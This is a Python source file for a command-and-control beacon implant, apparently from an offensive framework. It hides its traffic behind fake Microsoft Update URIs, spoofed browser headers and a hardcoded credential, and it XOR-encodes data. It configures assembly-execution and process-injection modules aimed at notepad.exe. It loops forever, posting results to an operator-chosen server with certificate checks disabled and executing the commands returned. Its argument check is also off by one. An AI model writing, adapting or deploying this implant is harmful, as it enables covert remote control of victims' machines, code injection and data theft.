import sys
import time
import json
import random

import requests

import urllib3
urllib3.disable_warnings()

from Beacon import Beacon

CONFIG_JSON = r"""
{
    "DomainName": "",
    "ExposedIp": "",
    "xorKey": "dfsdgferhzdzxczevre5595485sdg",
    "ListenerHttpConfig": {
        "uri": [
            "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/admin.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/download.aspx"
        ],
        "client": {
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                "Connection": "Keep-Alive",
                "Content-Type": "text/plain;charset=UTF-8",
                "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ==",
                "Keep-Alive": "timeout=5, max=1000",
                "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1",
                "Accept": "*/*",
                "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
                "Sec-Ch-Ua-Platform": "Windows"
            }
        }
    },
    "ListenerHttpsConfig": {
        "uri": [
            "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/upload.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/config.aspx"
        ],
        "client": {
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                "Connection": "Keep-Alive",
                "Content-Type": "text/plain;charset=UTF-8",
                "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ==",
                "Keep-Alive": "timeout=5, max=1000",
                "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1",
                "Accept": "*/*",
                "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
                "Sec-Ch-Ua-Platform": "Windows"
            }
        }
    },
    "ModulesConfig": {
        "assemblyExec": {
            "process": "notepad.exe",
            "test": "test"
        },
        "inject": {
            "process": "notepad.exe",
            "test": "test"
        },
        "toto": {
            "process": "test",
            "test": "test"
        }
    }
}
"""

def load_config_from_const():
    """Parse the JSON string constant and return it as a Python dict."""
    return json.loads(CONFIG_JSON)


DEFAULT_HTTP_SCHEME = "http"
DEFAULT_HTTPS_SCHEME = "https"
DEFAULT_ENDPOINT_FALLBACK = "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"
DEFAULT_CONTENT_TYPE = "text/plain;charset=UTF-8"
DEFAULT_ROOT_ENDPOINT = "/"
HEADER_CONTENT_TYPE = "Content-Type"
CONFIG_KEY_XOR = "xorKey"
CONFIG_KEY_LISTENER_HTTPS = "ListenerHttpsConfig"
CONFIG_KEY_LISTENER_HTTP = "ListenerHttpConfig"
CONFIG_KEY_URI = "uri"
CONFIG_KEY_CLIENT = "client"
CONFIG_KEY_HEADERS = "headers"

ERROR_MISSING_ARGUMENT = "Error: missing argument"
SLEEP_DIVISOR_SECONDS = 1000


class BeaconHttp(Beacon):

    def __init__(self, url, port, isHttps):
        super().__init__()
        self.url = str(url)
        self.port = str(port)
        self.isHttps = isHttps.lower() == DEFAULT_HTTPS_SCHEME
        self.scheme = DEFAULT_HTTPS_SCHEME if self.isHttps else DEFAULT_HTTP_SCHEME
        self._headers = {}
        self._uris = []

        self._load_config()

    def checkIn(self):
        payload = self.serialize_task_results()

        if self._uris:
            endpoint = random.choice(self._uris)
        else:
            endpoint = DEFAULT_ROOT_ENDPOINT

        if not endpoint.startswith(DEFAULT_ROOT_ENDPOINT):
            endpoint = DEFAULT_ROOT_ENDPOINT + endpoint

        url = f"{self.scheme}://{self.url}:{self.port}{endpoint}"

        verify = False if self.isHttps else True

        try:
            response = requests.post(
                url,
                data=payload.encode("utf-8"),
                headers=self._headers,
                verify=verify,
                timeout=15,
            )
        except requests.RequestException:
            return

        if response.status_code != 200:
            return

        body = response.content.decode("utf-8", errors="ignore").strip()
        if not body:
            return

        self.cmdToTasks(body)


    def _load_config(self) -> None:
        config_data = load_config_from_const()

        xor_key = config_data.get(CONFIG_KEY_XOR, "")
        self.set_xor_key(xor_key)

        listener_key = CONFIG_KEY_LISTENER_HTTPS if self.isHttps else CONFIG_KEY_LISTENER_HTTP
        listener_cfg = config_data.get(listener_key, {})

        uris = listener_cfg.get(CONFIG_KEY_URI, [])
        if isinstance(uris, list) and uris:
            self._uris = [str(uri) for uri in uris if isinstance(uri, str)]
        else:
            self._uris = [DEFAULT_ENDPOINT_FALLBACK]

        headers = (
            listener_cfg.get(CONFIG_KEY_CLIENT, {})
            .get(CONFIG_KEY_HEADERS, {})
        )
        if isinstance(headers, dict) and headers:
            self._headers = {str(k): str(v) for k, v in headers.items()}
        else:
            self._headers = {HEADER_CONTENT_TYPE: DEFAULT_CONTENT_TYPE}

        if HEADER_CONTENT_TYPE not in self._headers:
            self._headers[HEADER_CONTENT_TYPE] = DEFAULT_CONTENT_TYPE



    def runTasks(self):
        self.execInstruction()



def main() -> int:

    if len(sys.argv) < 3:
        print(ERROR_MISSING_ARGUMENT)
        sys.exit(1)

    url = sys.argv[1]
    port = sys.argv[2]
    isHttps = sys.argv[3]

    beaconHttp = BeaconHttp(url, port, isHttps)
    
    while 1:
        beaconHttp.checkIn()

        beaconHttp.runTasks()

        time.sleep(beaconHttp.sleepTimeMs / SLEEP_DIVISOR_SECONDS)

    return 0

if __name__ == '__main__':
    main()

